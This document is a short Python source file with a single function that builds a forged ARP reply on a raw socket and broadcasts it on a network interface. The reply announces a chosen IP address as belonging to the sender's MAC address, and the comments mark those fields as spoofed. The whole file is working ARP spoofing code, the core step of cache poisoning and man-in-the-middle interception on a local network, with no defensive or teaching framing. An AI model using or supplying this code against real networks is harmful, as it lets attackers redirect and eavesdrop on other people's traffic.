import socket
import struct
import binascii

def send_arp_packet(interface, target_ip, spoof_ip, your_mac):

    try:
        # Create a raw socket
        raw_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))  # ARP EtherType
        
        # Bind the socket to the interface (e.g., eth0)
        raw_socket.bind((interface, 0))

        # Convert MAC address from string to binary format
        mac = bytes.fromhex(your_mac.replace(":", ""))

        # Broadcast MAC address
        broadcast_address = b'\xFF\xFF\xFF\xFF\xFF\xFF'

        # ARP Packet EtherType for ARP (0x0806)
        EtherType = 0x0806

        # Ethernet header (destination MAC, source MAC, EtherType)
        ethernet_header = struct.pack("!6s6sH", broadcast_address, mac, EtherType)

        # ARP Header fields
        hardware_type = 1  # Ethernet
        protocol_type = 0x0800  # IPv4
        hardware_address_len = 6  # MAC length
        protocol_address_len = 4  # IP length
        opcode = 2  # ARP Response (Reply)
        
        # ARP Header
        arp_header = struct.pack('!HHBBH6s4s6s4s',
                                 hardware_type,
                                 protocol_type,
                                 hardware_address_len,
                                 protocol_address_len,
                                 opcode,
                                 mac,  # Sender MAC Address (spoofed)
                                 socket.inet_aton(spoof_ip),  # Sender IP Address (spoofed)
                                 mac,  # Target MAC Address (same as sender in reply)
                                 socket.inet_aton(target_ip))  # Target IP Address
        
        # Construct the full packet (Ethernet + ARP)
        packet = ethernet_header + arp_header

        # Debugging: Print the raw packet in hexadecimal
        

        # Send the packet
        raw_socket.send(packet)

        # Close the socket after sending the packet
        raw_socket.close()


    except Exception as e:
        print(f"An error occurred: {e}")
